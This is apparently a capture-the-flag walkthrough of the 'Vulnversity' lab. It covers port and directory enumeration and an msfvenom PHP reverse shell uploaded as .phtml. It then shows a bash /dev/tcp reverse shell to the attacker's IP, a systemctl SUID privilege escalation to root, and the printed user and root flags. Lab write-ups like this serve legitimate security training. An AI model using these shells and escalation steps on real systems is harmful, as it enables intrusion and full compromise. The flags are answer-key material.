# Vulnversity.

(root㉿kali)-[/home/kali]
└─# ping -c 1 10.112.171.149

PING 10.112.171.149 (10.112.171.149) 56(84) bytes of data.
64 bytes from 10.112.171.149: icmp_seq=1 ttl=62 time=22.5 ms

┌──(root㉿kali)-[/home/kali]
└─# nmap -p- -sS -sC -sV --open --min-rate=2000 -vvv -Pn IP 10.112.171.149

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 62 vsftpd 3.0.5
22/tcp   open  ssh         syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 Ubuntu Linux; protocol. 
139/tcp  open  netbios-ssn syn-ack ttl 62 Samba smbd 4
445/tcp  open  netbios-ssn syn-ack ttl 62 Samba smbd 4
3128/tcp open  http-proxy  syn-ack ttl 62 Squid http proxy 4.10
3333/tcp open  http        syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))

# Ports open:

21 FTP

22 SSH

139 Samba

445 Samba

3128, con proxy

3333 http apache

(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.112.171.149:3333/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php

# Starting gobuster in directory enumeration mode

/.php                 (Status: 403) [Size: 281]
/images               (Status: 301) [Size: 324] [--> http://10.112.171.149:3333/images/]

/css                  (Status: 301) [Size: 321] [--> http://10.112.171.149:3333/css/]

/js                   (Status: 301) [Size: 320] [--> http://10.112.171.149:3333/js/]

/fonts                (Status: 301) [Size: 323] [--> http://10.112.171.149:3333/fonts/]

/internal             (Status: 301) [Size: 326] [--> http://10.112.171.149:3333/internal/]

# We navigate to the internal directory and find that file uploads are enabled. Consequently, we create a payload and upload it. 

msfvenom -p php/reverse_php LHOST=192.168.188.156 LPORT=443 -f raw > vulnversity.php

# We change the extension to .phtml, as .php uploads are restricted. Then, we navigate to the URL http://10.112.171.149:3333/internal/uploads/ to execute the payload.

┌──(root㉿kali)-[/home/kali]
└─# mv vulnversity.php vulnversity.phtml

# We set up a listener on port 433 and receive the connection upon loading the page. Then, we stabilize the connection using a reverse shell on port 444.

┌──(root㉿kali)-[/home/kali]
└─# nc -nlvp 443

listening on [any] 443 ...
connect to [192.168.188.156] from (UNKNOWN) [10.112.171.149] 51402
bash -c "sh -i >& /dev/tcp/192.168.188.156/444 0>&1"

┌──(root㉿kali)-[/home/kali]
└─# nc -nlvp 444

listening on [any] 444 ...
connect to [192.168.188.156] from (UNKNOWN) [10.114.158.69] 37372
sh: 0: can't access tty; job control turned off

# We search for binaries to escalate privileges:

$ find / -perm -4000 2>/dev/null$

# If we search for information on all of them, we can see that we can escalate privileges using /bin/systemctl. Before proceeding, we must perform TTY treatment (or TTY stabilization). 

$ script /dev/null -c bash

┌──(root㉿kali)-[/home/kali]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 444
reset xterm

www-data@ip-10-114-158-69:/var/www/html/internal/uploads$ export SHELL=bash
www-data@ip-10-114-158-69:/var/www/html/internal/uploads$ export TERM=xterm

# We can now begin the privilege escalation process; after searching for information on SUID binaries, we have found the following prompt:

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

# After saving it in a nano file with a .sh extension, we execute it using:

www-data@ip-10-114-158-69:/tmp$ bash [escalada.vulnversity.sh](http://escalada.vulnversity.sh/)

www-data@ip-10-114-158-69:/tmp$ bash -p

bash-5.0# whoami
root

# We now have root privileges. To find the lab questions:

bash-5.0# cd /home
bash-5.0# ls
bill  ubuntu
bash-5.0# cd /home/bill
bash-5.0# ls
user.txt
bash-5.0# cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb

# For root flag:

bash-5.0# cd root/
bash-5.0# ls
root.txt  snap
bash-5.0# cat root.txt
a58ff8579f0a9270368d33a9966c7fd5